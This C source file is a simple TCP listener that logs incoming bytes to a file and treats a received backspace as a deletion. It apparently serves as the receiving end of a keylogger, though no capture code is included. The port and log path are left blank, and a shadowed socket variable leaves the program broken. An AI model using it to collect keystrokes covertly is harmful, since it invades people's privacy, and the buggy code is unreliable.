#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>

FILE *file;
int sock, accepted;

int shutoff() {
    close(accepted);
    close(sock);
    fflush(file);
    fclose(file);
    return 0;

}

int main() {
    struct sockaddr_in server;
    int port = ;//desired port
    server.sin_port = htons(port);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    sock = socket(AF_INET, SOCK_STREAM, 0);

    int opt = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("[X] setsockopt failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    printf("[-] Binding the socket...\n");
    int lock = bind(sock,(struct sockaddr*)&server,sizeof(server));
    if(lock < 0) {
        perror("[X] bind failed");
        exit(EXIT_FAILURE);
    }

    printf("[+] Bind completed \n");
    listen(sock,3);

    printf("[-] Waiting for connection...\n");

    socklen_t len = sizeof(server);
    int accepted = accept(sock, (struct sockaddr *) &server, &len);
    if (accepted >= 0) {
        file = fopen(" ","a"); //path to your log
        printf("[+] Connection accepted \n");
        printf("[+] log.txt opened \n");
    }

    int stdin_flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    fcntl(STDIN_FILENO, F_SETFL, stdin_flags | O_NONBLOCK);


    char data[1024];
    ssize_t data_received;
    char exit_code[50] = ""; 
    printf("type exit to close socket \n");
    while (1){  
         data_received = recv(accepted,data,sizeof(data),MSG_DONTWAIT);
        if (data_received > 0) {
            for (int i= 0; i < data_received; i++) {
                long size = ftell(file);
                if (data[i] ==  '\b') {
                    if (size > 0) {
                        fseek(file,-1,SEEK_CUR);
                        ftruncate(fileno(file),size-1);
                    }
                }else {
                    fwrite(&data[i],1,1,file); 
                    fflush(file);
                }
            }
        }else if (data_received < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            break;
        }

        if (fgets(exit_code,sizeof(exit_code),stdin) != NULL) {
            exit_code[strcspn(exit_code, "\n")] = '\0';
            if (strcmp(exit_code, "exit") == 0 || strcmp(exit_code, "Exit") == 0) {
                printf("[-] saving data to file \n");
                printf("[+] data successfully saved \n");
                printf("[+] log.txt closed \n");
                printf("[+] socket closed \n");
                printf("[+] Exiting \n");
                shutoff();
                break;
            }
        }
        usleep(100000);
    }
    return 0;
}
